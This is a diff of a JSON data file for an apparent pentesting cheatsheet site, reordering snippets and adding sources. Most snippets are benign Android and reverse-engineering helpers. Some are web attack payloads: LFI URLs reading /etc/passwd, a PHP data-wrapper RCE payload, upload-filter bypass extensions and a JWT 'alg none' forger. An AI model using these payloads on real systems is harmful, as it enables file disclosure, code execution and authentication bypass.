@@ -1,69 +1,33 @@
 [
   {
-    "title": "Android logcat",
-    "description": "Get adb logcat logs provided the application package name",
+    "title": "About",
+    "description": "",
     "tags": [
-      "mobile",
-      "android",
-      "bash"
+      "about"
     ],
     "data": [
       {
-        "description": "Usage: logcat com.example.app",
-        "language": "bash",
-        "command": "function logcat(){\n\tadb logcat | grep -F \"`adb shell ps | grep $1  | tr -s [:space:] ' ' | cut -d' ' -f2`\"\n}"
-      }
-    ]
-  },
-  {
-    "title": "CLI .NET decompiler",
-    "description": "Extract the source code (.cs) of a .NET binary",
-    "tags": [
-      "rev",
-      ".NET"
-    ],
-    "data": [
-      {
-        "description": "First download both to /opt:",
-        "language": "bash",
-        "command": "curl -o /opt/ https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar\ncurl -o /opt/ https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar"
+        "description": "Weaponize.it is your go-to resource for gaining insights into ethical hacking, pentesting, bug bounty hunting, and scripting. Explore a curated collection of powerful and practical tips and tricks related to cybersecurity, programming, and system exploitation.",
+        "language": ""
       },
       {
-        "description": "Usage: ilspy example.exe",
-        "language": "bash",
-        "command": "function ilspy(){\n\tsudo docker run --rm -v `pwd`:/samples cincan/ilspy /samples/\"$1\" > `basename $1`.cs\n\techo `basename $1`.cs\n}"
-      }
-    ]
-  },
-  {
-    "title": "Crack zip file password",
-    "description": "Extract the hash of a zip file and crack it based on a wordlist",
-    "tags": [
-      "cracking",
-      "zip",
-      "crypto"
-    ],
-    "data": [
+        "description": "The website was designed to provide you a collection of guides, one-liners, cheatsheets and code snippets to make your life as a hacker easier. Quickly search for keywords and find what suits you best.",
+        "language": ""
+      },
       {
-        "description": "",
-        "language": "bash",
-        "command": "zip2john file.zip > hash.txt\njohn hash.txt\njohn hash.txt --show"
-      }
-    ]
-  },
-  {
-    "title": "Emulate a MySQL interactive shell",
-    "description": "PHP script to emulate a MySQL interactive shell in a host. Use it if there is no MySQL client available.",
-    "tags": [
-      "web",
-      "PHP",
-      "MySQL"
-    ],
-    "data": [
+        "description": "Join us on GitHub and feel free to contribute with your own scripts, one-liners, functions or techniques.",
+        "language": "",
+        "command": ""
+      },
       {
-        "description": "",
-        "language": "php",
-        "command": "<?php\n\n$host = 'localhost';\n$username = 'your_username';\n$password = 'your_password';\n$database = 'your_database';\n\n$mysqli = new mysqli($host, $username, $password, $database);\n\nif ($mysqli->connect_error)\n    die(\"Connection failed: \" . $mysqli->connect_error);\n\necho \"Connected to MySQL. Type 'exit' to quit.\n\";\n\nwhile(1){\n    $input = readline(\"mysql> \");\n    \n    if($input === 'exit')\n        break;\n\n    $result = $mysqli->query($input);\n\n    if(!$result)\n        echo \"Error: \" . $mysqli->error . \"\n\";\n    else{\n        if($result->num_rows > 0){\n            while($row = $result->fetch_assoc())\n                print_r($row);\n        }else{\n            echo \"Query OK, \" . $mysqli->affected_rows . \" rows affected\n\";\n        }\n        $result->free();\n    }        \n}\n\n$mysqli->close();\necho \"Exited MySQL shell.\n\";"
+        "description": "Quite often, in the midst of my pentests or during CTFs, I find myself in the search for a script I used ages ago, or I end up scrolling through numerous commands in the terminal history, attempting to recall what I need, or navigating through a cluster of 10 cheatsheets just to find that one specific command.",
+        "language": "Why?",
+        "command": ""
+      },
+      {
+        "description": "Using Weaponize.it, I can simply input keywords relevant to my desired information into the search bar, and instantaneously search through community-contributed data.",
+        "language": "",
+        "command": ""
       }
     ]
   },
@@ -89,183 +53,70 @@
     ]
   },
   {
-    "title": "Extract shell code from object file",
-    "description": "Bash function to get a file.o and return the corresponding shellcode",
+    "title": "Emulate a MySQL interactive shell",
+    "description": "PHP script to emulate a MySQL interactive shell in a host. Use it if there is no MySQL client available.",
     "tags": [
-      "pwn",
-      "misc",
-      "bash"
+      "web",
+      "PHP",
+      "MySQL"
+    ],
+    "data": [
+      {
+        "description": "",
+        "language": "php",
+        "command": "<?php\n\n$host = 'localhost';\n$username = 'your_username';\n$password = 'your_password';\n$database = 'your_database';\n\n$mysqli = new mysqli($host, $username, $password, $database);\n\nif ($mysqli->connect_error)\n    die(\"Connection failed: \" . $mysqli->connect_error);\n\necho \"Connected to MySQL. Type 'exit' to quit.\n\";\n\nwhile(1){\n    $input = readline(\"mysql> \");\n    \n    if($input === 'exit')\n        break;\n\n    $result = $mysqli->query($input);\n\n    if(!$result)\n        echo \"Error: \" . $mysqli->error . \"\n\";\n    else{\n        if($result->num_rows > 0){\n            while($row = $result->fetch_assoc())\n                print_r($row);\n        }else{\n            echo \"Query OK, \" . $mysqli->affected_rows . \" rows affected\n\";\n        }\n        $result->free();\n    }        \n}\n\n$mysqli->close();\necho \"Exited MySQL shell.\n\";"
+      }
+    ]
+  },
+  {
+    "title": "Crack zip file password",
+    "description": "Extract the hash of a zip file and crack it based on a wordlist",
+    "tags": [
+      "cracking",
+      "zip",
+      "crypto"
     ],
     "data": [
       {
         "description": "",
         "language": "bash",
-        "command": "function obj2sh(){\n    objdump -d -M intel-mnemonic \"$1\" | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s\n}"
+        "command": "zip2john file.zip > hash.txt\njohn hash.txt\njohn hash.txt --show"
       }
     ]
   },
   {
-    "title": "File upload extension bypass",
-    "description": "Modify the file extension and bypass filters on file uploads",
+    "title": "CLI .NET decompiler",
+    "description": "Extract the source code (.cs) of a .NET binary",
     "tags": [
-      "web",
-      "upload",
-      "RCE",
-      "bypass"
-    ],
-    "data": [
-      {
-        "description": "Alternative PHP extensions:",
-        "command": ".php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, .inc"
-      },
-      {
-        "description": "Bypass contains():",
-        "command": ".jpg.php, .jpg.php5, .jpg.phtml"
-      },
-      {
-        "description": "Bypass pathinfo():",
-        "command": ".php%00.jpg, .php5%00.jpg"
-      },
-      {
-        "description": "Bypass pathinfo() [double encoding]:",
-        "command": ".php%2500.jpg, .php5%2500.jpg"
-      }
-    ]
-  },
-  {
-    "title": "Find potential IDOR on BurpSuite",
-    "description": "",
-    "tags": [
-      "web",
-      "IDOR"
-    ],
-    "data": [
-      {
-        "description": "Filter by search term (with regex) on Burp's proxy tab:",
-        "command": "(?i)\b\\w*id\b(?!\\w)\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^&\\s}]*)"
-      }
-    ]
-  },
-  {
-    "title": "Geolocate IP address",
-    "description": "Quickly get info about an IP address (country, city, provider, etc.)",
-    "tags": [
-      "bash",
-      "osint",
-      "misc"
-    ],
-    "data": [
-      {
-        "description": "Substitute <IP ADDRESS>:",
-        "language": "bash",
-        "command": "curl -s http://ip-api.com/json/<IP ADDRESS> | jq"
-      }
-    ]
-  },
-  {
-    "title": "List the last 10 files modified on a folder",
-    "description": "",
-    "tags": [
-      "linux",
-      "forensics"
-    ],
-    "data": [
-      {
-        "description": "",
-        "language": "bash",
-        "command": "find $1 -type f -exec stat --format '%Y :%y %n' \"{}\" \\; | sort -nr | cut -d: -f2- | head"
-      }
-    ]
-  },
-  {
-    "title": "Permanently delete a file",
-    "description": "Overwrites a file's data 40 times with random patterns and delete it",
-    "tags": [
-      "misc"
-    ],
-    "data": [
-      {
-        "description": "Substitute <file>:",
-        "language": "bash",
-        "command": "shred -vfzun40 <file>"
-      }
-    ]
-  },
-  {
-    "title": "Pull Android mobile app .apk from phone",
-    "description": "Extract the .apk from a mobile app provided the application package id",
-    "tags": [
-      "mobile",
-      "android",
-      "bash",
-      "apk"
-    ],
-    "data": [
-      {
-        "description": "Usage: pull-apk <package id>:",
-        "language": "bash",
-        "command": "function pull-apk(){\n\tpkg_name=$(adb shell pm list packages | cut -d: -f2 | grep $1)\n\tadb pull \"$(adb shell pm path $pkg_name | cut -d: -f2 | grep base)\"\n\tmv base.apk $pkg_name.apk &> /dev/null\n}"
-      }
-    ]
-  },
-  {
-    "title": "Read files/RCE with PHP wrappers",
-    "description": "Exploiting local file inclusion (LFI) with php filters",
-    "tags": [
-      "web",
-      "LFI",
-      "RCE"
-    ],
-    "data": [
-      {
-        "description": "PHP wrapper:",
-        "command": "fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd"
-      },
-      {
-        "description": "PHP wrapper (base64):",
-        "command": "fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
-      },
-      {
-        "description": "RCE through PHP data wrapper with base64:",
-        "command": "fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="
-      }
-    ]
-  },
-  {
-    "title": "Repack Android app",
-    "description": "Repack an Android app, sign it an reinstall on the device",
-    "tags": [
-      "mobile",
-      "android",
-      "bash"
+      "rev",
+      ".NET"
     ],
     "data": [
       {
         "description": "First download both to /opt:",
         "language": "bash",
-        "command": "curl -o /opt/ https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar"
+        "command": "curl -o /opt/ https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar\ncurl -o /opt/ https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar"
       },
       {
-        "description": "Usage: repack <folder where apk was extracted to>",
+        "description": "Usage: ilspy example.exe",
         "language": "bash",
-        "command": "function repack(){\n\tname=$(echo -n \"$1\" | sed \"s/\\///g\")\n\tpackage_name=$(grep \"package=\"\" \"${name}/AndroidManifest.xml\"  | sed -E \"s/.*package=\"([^\"]+)\".*/\\1/g\")\n \techo \"[*] Repacking...\"\n \tjava -jar /opt/apktool_2.6.1.jar b \"$1\" -o \"${name}.apk\"\n\techo -e  \"\n[*] Signing...\"\n\tjava -jar /opt/uber-apk-signer-1.2.1.jar -a \"${name}.apk\" -o \"${name}_signed\"\n\tmv \"${name}_signed/${name}-aligned-debugSigned.apk\" ${name}_signed.apk\n\trm -r \"${name}_signed/\"\n\techo -e \"\n[*] Uninstalling old $package_name...\"\n\tadb uninstall $package_name\n\techo -e \"\n[*] Installing ${name}_signed.apk...\"\n\tadb install \"${name}_signed.apk\"\n}"
+        "command": "function ilspy(){\n\tsudo docker run --rm -v `pwd`:/samples cincan/ilspy /samples/\"$1\" > `basename $1`.cs\n\techo `basename $1`.cs\n}"
       }
     ]
   },
   {
-    "title": "Set 'none' as a JWT algorythm",
-    "description": "Get a JWT and returns it with 'none' as its algorythm, and without signature",
+    "title": "Android logcat",
+    "description": "Get adb logcat logs provided the application package name",
     "tags": [
-      "jwt",
-      "web",
-      "bash",
-      "bug bounty"
+      "mobile",
+      "android",
+      "bash"
     ],
     "data": [
       {
-        "description": "",
+        "description": "Usage: logcat com.example.app",
         "language": "bash",
-        "command": "function jwtnonefy(){\n   header=$(echo \"$1\" | cut -d. -f1 | base64 -d | sed -E \"s/\"alg\":\"([^\"]+)\"/\"alg\":\"none\"/g\" | base64 | sed 's/=//g');\n   payload=$(echo \"$1\" | cut -d. -f 2);\n   echo -e \"\n\"$header.$payload.\n}"
+        "command": "function logcat(){\n\tadb logcat | grep -F \"`adb shell ps | grep $1  | tr -s [:space:] ' ' | cut -d' ' -f2`\"\n}"
       }
     ]
   },
@@ -313,6 +164,193 @@
         "description": "",
         "language": "bash",
         "command": "frida --codeshare pbalmelle/android-ssl-bypass -f <com.example.app>"
+      }
+    ]
+  },
+  {
+    "title": "Set 'none' as a JWT algorythm",
+    "description": "Get a JWT and returns it with 'none' as its algorythm, and without signature",
+    "tags": [
+      "jwt",
+      "web",
+      "bash",
+      "bug bounty"
+    ],
+    "data": [
+      {
+        "description": "",
+        "language": "bash",
+        "command": "function jwtnonefy(){\n   header=$(echo \"$1\" | cut -d. -f1 | base64 -d | sed -E \"s/\"alg\":\"([^\"]+)\"/\"alg\":\"none\"/g\" | base64 | sed 's/=//g');\n   payload=$(echo \"$1\" | cut -d. -f 2);\n   echo -e \"\n\"$header.$payload.\n}"
+      }
+    ]
+  },
+  {
+    "title": "Repack Android app",
+    "description": "Repack an Android app, sign it an reinstall on the device",
+    "tags": [
+      "mobile",
+      "android",
+      "bash"
+    ],
+    "data": [
+      {
+        "description": "First download both to /opt:",
+        "language": "bash",
+        "command": "curl -o /opt/ https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar"
+      },
+      {
+        "description": "Usage: repack <folder where apk was extracted to>",
+        "language": "bash",
+        "command": "function repack(){\n\tname=$(echo -n \"$1\" | sed \"s/\\///g\")\n\tpackage_name=$(grep \"package=\"\" \"${name}/AndroidManifest.xml\"  | sed -E \"s/.*package=\"([^\"]+)\".*/\\1/g\")\n \techo \"[*] Repacking...\"\n \tjava -jar /opt/apktool_2.6.1.jar b \"$1\" -o \"${name}.apk\"\n\techo -e  \"\n[*] Signing...\"\n\tjava -jar /opt/uber-apk-signer-1.2.1.jar -a \"${name}.apk\" -o \"${name}_signed\"\n\tmv \"${name}_signed/${name}-aligned-debugSigned.apk\" ${name}_signed.apk\n\trm -r \"${name}_signed/\"\n\techo -e \"\n[*] Uninstalling old $package_name...\"\n\tadb uninstall $package_name\n\techo -e \"\n[*] Installing ${name}_signed.apk...\"\n\tadb install \"${name}_signed.apk\"\n}"
+      }
+    ]
+  },
+  {
+    "title": "Read files/RCE with PHP wrappers",
+    "description": "Exploiting local file inclusion (LFI) with php filters",
+    "tags": [
+      "web",
+      "LFI",
+      "RCE"
+    ],
+    "source": [
+      "https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225"
+    ],
+    "data": [
+      {
+        "description": "PHP wrapper:",
+        "command": "fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd"
+      },
+      {
+        "description": "PHP wrapper (base64):",
+        "command": "fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
+      },
+      {
+        "description": "RCE through PHP data wrapper with base64:",
+        "command": "fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="
+      }
+    ]
+  },
+  {
+    "title": "Pull Android mobile app .apk from phone",
+    "description": "Extract the .apk from a mobile app provided the application package id",
+    "tags": [
+      "mobile",
+      "android",
+      "bash",
+      "apk"
+    ],
+    "data": [
+      {
+        "description": "Usage: pull-apk <package id>:",
+        "language": "bash",
+        "command": "function pull-apk(){\n\tpkg_name=$(adb shell pm list packages | cut -d: -f2 | grep $1)\n\tadb pull \"$(adb shell pm path $pkg_name | cut -d: -f2 | grep base)\"\n\tmv base.apk $pkg_name.apk &> /dev/null\n}"
+      }
+    ]
+  },
+  {
+    "title": "Permanently delete a file",
+    "description": "Overwrites a file's data 40 times with random patterns and delete it",
+    "tags": [
+      "misc"
+    ],
+    "data": [
+      {
+        "description": "Substitute <file>:",
+        "language": "bash",
+        "command": "shred -vfzun40 <file>"
+      }
+    ]
+  },
+  {
+    "title": "List the last 10 files modified on a folder",
+    "description": "",
+    "tags": [
+      "linux",
+      "forensics"
+    ],
+    "data": [
+      {
+        "description": "",
+        "language": "bash",
+        "command": "find $1 -type f -exec stat --format '%Y :%y %n' \"{}\" \\; | sort -nr | cut -d: -f2- | head"
+      }
+    ]
+  },
+  {
+    "title": "Geolocate IP address",
+    "description": "Quickly get info about an IP address (country, city, provider, etc.)",
+    "tags": [
+      "bash",
+      "osint",
+      "misc"
+    ],
+    "data": [
+      {
+        "description": "Substitute <IP ADDRESS>:",
+        "language": "bash",
+        "command": "curl -s http://ip-api.com/json/<IP ADDRESS> | jq"
+      }
+    ]
+  },
+  {
+    "title": "Find potential IDOR on BurpSuite",
+    "description": "",
+    "tags": [
+      "web",
+      "IDOR"
+    ],
+    "source": [
+      "https://twitter.com/Moblig_/status/1684273682296758274"
+    ],
+    "data": [
+      {
+        "description": "Filter by search term (with regex) on Burp's proxy tab:",
+        "command": "(?i)\b\\w*id\b(?!\\w)\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^&\\s}]*)"
+      }
+    ]
+  },
+  {
+    "title": "File upload extension bypass",
+    "description": "Modify the file extension and bypass filters on file uploads",
+    "tags": [
+      "web",
+      "upload",
+      "RCE",
+      "bypass"
+    ],
+    "data": [
+      {
+        "description": "Alternative PHP extensions:",
+        "command": ".php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, .inc"
+      },
+      {
+        "description": "Bypass contains():",
+        "command": ".jpg.php, .jpg.php5, .jpg.phtml"
+      },
+      {
+        "description": "Bypass pathinfo():",
+        "command": ".php%00.jpg, .php5%00.jpg"
+      },
+      {
+        "description": "Bypass pathinfo() [double encoding]:",
+        "command": ".php%2500.jpg, .php5%2500.jpg"
+      }
+    ]
+  },
+  {
+    "title": "Extract shell code from object file",
+    "description": "Bash function to get a file.o and return the corresponding shellcode",
+    "tags": [
+      "pwn",
+      "misc",
+      "bash"
+    ],
+    "data": [
+      {
+        "description": "",
+        "language": "bash",
+        "command": "function obj2sh(){\n    objdump -d -M intel-mnemonic \"$1\" | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s\n}"
       }
     ]
   },
@@ -385,38 +423,11 @@
         "description": "Substitute <app.apk>:",
         "language": "bash",
         "command": "apktool d <app.apk>; cd app;mkdir collection; find . -name \\*.smali -exec sh -c \"cp {} collection/\\$(head /dev/urandom | md5 | cut -d' ' -f1).smali\" \\;; linkfinder -i 'collection/*.smali' -o cli"
-      }
-    ]
-  },
-  {
-    "title": "About",
-    "description": "",
-    "tags": [
-      "about"
-    ],
-    "data": [
-      {
-        "description": "Weaponize.it is your go-to resource for gaining insights into ethical hacking, pentesting, bug bounty hunting, and scripting. Explore a curated collection of powerful and practical tips and tricks related to cybersecurity, programming, and system exploitation.",
-        "language": ""
       },
       {
-        "description": "The website was designed to provide you a collection of guides, one-liners, cheatsheets and code snippets to make your life as a hacker easier. Quickly search for keywords and find what suits you best.",
-        "language": ""
-      },
-      {
-        "description": "Join us on GitHub and feel free to contribute with your own scripts, one-liners, functions or techniques.",
-        "language": "",
-        "command": ""
-      },
-      {
-        "description": "Quite often, in the midst of my pentests or during CTFs, I find myself in the search for a script I used ages ago, or I end up scrolling through numerous commands in the terminal history, attempting to recall what I need, or navigating through a cluster of 10 cheatsheets just to find that one specific command.",
-        "language": "Why?",
-        "command": ""
-      },
-      {
-        "description": "Using Weaponize.it, I can simply input keywords relevant to my desired information into the search bar, and instantaneously search through community-contributed data.",
-        "language": "",
-        "command": ""
+        "description": "Other method:",
+        "language": "bash",
+        "command": "# Download https://github.com/n0mi1k/apk2url (also download required dependencies)\n./apk2url.sh <app.apk>"
       }
     ]
   }
